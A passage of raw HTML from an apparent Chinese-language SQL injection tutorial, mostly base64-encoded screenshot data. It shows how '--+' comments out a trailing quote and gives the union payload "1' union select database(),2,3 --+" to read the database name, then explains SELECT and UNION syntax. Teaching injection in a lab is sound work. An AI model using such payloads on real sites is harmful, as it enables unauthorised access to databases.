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" width="1038" height="211" class="img_ev3q"></p>
<p>但是可以使用--+来注释掉后面那个引号，即id=&#x27;1&#x27; limit 1;</p>
<p><img decoding="async" loading="lazy" alt="image-20211218145356322" src="data:image/png;base64,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" width="1187" height="211" class="img_ev3q"></p>
<p>于是用union查询来获取database</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1&#x27; union select database(),2,3 --+</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>select、union的用法是</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">列名</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> 表名</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">列名</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> 表名  </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> 条件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">union</span><span class="token plain">:该操作符用于取得两个结果集的并集。当使用该操作符时，会自动去掉结果集中重复行。</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 